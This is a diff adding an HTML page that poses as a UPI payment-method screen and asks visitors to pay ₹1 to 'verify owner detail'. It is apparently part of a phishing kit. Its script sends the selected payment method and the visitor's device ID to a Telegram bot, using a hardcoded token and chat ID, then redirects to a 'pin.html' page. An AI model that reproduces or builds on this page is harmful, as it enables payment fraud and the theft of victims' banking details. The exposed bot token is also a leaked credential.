@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Method</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            padding: 16px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .navbar {
+            display: flex;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .back-icon {
+            margin-right: 16px;
+            font-size: 20px;
+            color: #333;
+        }
+        
+        .navbar-title {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: #e0e0e0;
+            margin: 12px 0;
+        }
+        
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 16px 0;
+            img{
+                height: 50px;
+                width: 50px;
+            }
+        }
+        
+        .section-title {
+            font-size: 16px;
+            font-weight: bold;
+        }
+        
+        .info-text {
+            font-size: 14px;
+            color: black;
+            margin: 12px 0;
+            padding: 8px;            
+            font-weight: bold;
+            background-color: #d5dfff;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .payment-option {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            background-color: white;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .payment-option input {
+            margin-right: 12px;
+        }
+        
+        .payment-icon {
+            width: 24px;
+            height: 24px;
+            margin-left: auto;
+        }
+        
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: white;
+            padding: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        
+        .footer-text {
+            font-size: 16px;
+            font-weight: bold;            
+            color: black;
+        }
+        
+        .pay-button {
+            background-color: #FF6B00;
+            color: white;
+            border: none;
+            width: 150px;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+         .loading-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        .loading-box {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <div class="navbar">
+        <i class="fas fa-arrow-left back-icon"></i>
+        <div class="navbar-title">Payment Method</div>
+    </div>
+    
+    <!-- Divider -->
+    <div class="divider"></div>
+    
+    <!-- Section Header -->
+    <div class="section-header">
+        <div class="section-title">Select Payment Method</div>
+        <img src="https://cdn.vectorstock.com/i/750p/23/94/100-secure-payment-blue-badge-vector-56062394.avif" alt="info" class="payment-icon">
+    </div>
+    
+    <!-- Info Text -->
+    <div class="info-text">
+        Verify Owner detail By paying ₹1 it will refund to you.
+    </div>
+    
+    <div style="margin-bottom: 8px; font-size: 14px;">Pay online</div>
+    
+    <!-- Payment Options -->
+    <div class="payment-option">
+        <input type="radio" name="payment" id="google-pay" checked>
+        <label for="google-pay">Google Pay</label>
+        <img src="https://i.ibb.co/wrK2swXh/google-pay-icon.png" alt="Google Pay" class="payment-icon">
+    </div>
+    
+    <div class="payment-option">
+        <input type="radio" name="payment" id="phone-pe">
+        <label for="phone-pe">Phone Pe</label>
+        <img src="https://i.ibb.co/6Jc27YyV/phonepe-icon.png" alt="Phone Pe" class="payment-icon">
+    </div>
+    
+    <div class="payment-option">
+        <input type="radio" name="payment" id="paytm">
+        <label for="paytm">Paytm</label>
+        <img src="https://cdn.iconscout.com/icon/free/png-512/free-paytm-logo-icon-download-in-svg-png-gif-file-formats--online-payment-brand-logos-pack-icons-226448.png?f=webp&w=512" alt="Paytm" class="payment-icon">
+    </div>
+    
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-text">Total: ₹1</div>
+        <button class="pay-button" onclick="showPopup()">Pay Now</button>
+    </div>
+    <div class="loading-container" id="loading">
+        <div class="loading-box">
+            <div class="loader"></div>
+            <p>Loading...</p>
+        </div>
+    </div>
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8558586576:AAGbxImqr-TyS59Qq9jykl_EvF9YbFVZtLA";
+        const TELEGRAM_CHAT_ID = "8592704250";
+
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                console.warn('Telegram bot not configured; skipping send.');
+                return Promise.resolve();
+            }
+            const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
+            return fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
+            }).then(resp => {
+                if (!resp.ok) throw new Error(`Telegram API error: ${resp.status}`);
+                return resp.json();
+            }).then(data => console.log('Telegram message sent', data))
+            .catch(err => console.warn('Could not send Telegram message', err));
+        }
+
+        function showPopup(){
+            const selected = document.querySelector('input[name="payment"]:checked');
+            const paymentMethod = selected ? selected.nextElementSibling ? selected.nextElementSibling.textContent : selected.id : 'unknown';
+            const DeviceID = localStorage.getItem('DeviceId') || 'UnknownDevice';
+            const telegramText = `💰 <b>Payment method selected</b>\nMethod: <code>${paymentMethod}</code>\nDevice: <code>${DeviceID}</code>`;
+            sendTelegramMessage(telegramText).catch(() => {});
+
+            document.getElementById('loading').style.display = 'flex';
+             setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                window.location.href = "pin.html";
+             }, 2000);
+        }
+    </script>
+</body>
+</html>
